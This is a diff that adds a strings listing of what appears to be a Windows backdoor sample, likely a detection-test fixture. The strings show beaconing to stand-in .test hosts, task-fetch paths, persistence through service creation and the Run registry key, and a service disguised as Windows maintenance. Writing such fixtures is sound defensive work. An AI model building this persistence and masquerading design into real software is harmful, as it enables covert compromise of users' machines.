@@ -1,0 +1,32 @@
+!This program cannot be run in DOS mode.
+.text
+.rdata
+.data
+.rsrc
+KERNEL32.dll
+ADVAPI32.dll
+WINHTTP.dll
+GetComputerNameW
+GetUserNameW
+Sleep
+CreateServiceW
+RegSetValueExW
+WinHttpOpen
+WinHttpConnect
+WinHttpSendRequest
+DnsQuery_W
+guncelleme.kotu.test
+v.kotu.test
+/k/nabiz
+/k/gorev
+Mozilla/5.0 (BakimAjan/2.1)
+WinBakimSvc
+Windows Bakim Hizmeti
+Software\Microsoft\Windows\CurrentVersion\Run
+C:\Users\Public\bakim.exe
+-hizmet
+1800
+TEMIZLIK-2.1
+AYNA
+AYNA
+AYNA
